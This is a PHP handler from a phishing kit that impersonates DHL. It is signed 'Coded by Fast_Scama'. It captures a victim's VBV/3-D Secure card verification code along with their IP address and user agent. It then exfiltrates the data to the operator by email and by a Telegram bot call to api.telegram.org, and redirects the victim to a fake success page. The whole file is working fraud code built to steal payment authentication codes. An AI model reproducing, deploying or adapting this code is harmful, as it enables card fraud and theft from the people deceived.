<?php

include '../settings.php';


session_start();

$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


$_SESSION['vbv_code'] = $_POST['vbv_code'];




if (isset($_POST['vbv_submit'])) {
	if (!empty($_POST['vbv_code'])) {



		if ($mail_sending == true) {
			$message = "
					[📦] Informations | DHL MULTI 2023
					
					[📝] Code VBV  : " . $_SESSION['vbv_code'] . "					
								
					[🗺️] INFORMATIONS COMPLÉMENTAIRES [🗺️]
					[⌚] Heure et date du rez : " . $_SESSION['date_heure'] . "
					[🌐] IP : " . $_SESSION['ip'] . "
					[📍] User-agent : " . $_SESSION['useragent'] . "
					[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]
					";
			$subject = "  [INFO] |" . $_SESSION['vbv_code'] . " | " . $_SESSION['ip'];
			$headers = "From: VBV  | Spotify 2023 <rez@fastscama.fr>";
			mail($rezmail, $subject, $message, $headers);
		}


		if ($telegram_sending == true) {
			$data = [
				'text' => '
					[📦] VBV | DHL MULTI 2023 				
					
					[📝] Code VBV  : ' . $_SESSION['vbv_code'] . '			
					
					[🗺️] Informations liée au client  [🗺️]
					[⌚] Heure et date du rez : ' . $_SESSION['date_heure'] . '
					[🌐] Adresse Ip : ' . $_SESSION['ip'] . '
					[📍] User-agent : ' . $_SESSION['useragent'] . '

					[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]			  
					',
				'chat_id' => $chat_login
			]; //1.1


			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
		}

		header('Location: ../user/succes.php');
	} else {
		header('Location: ../user/3ds.php?error=1');
	}

}



?>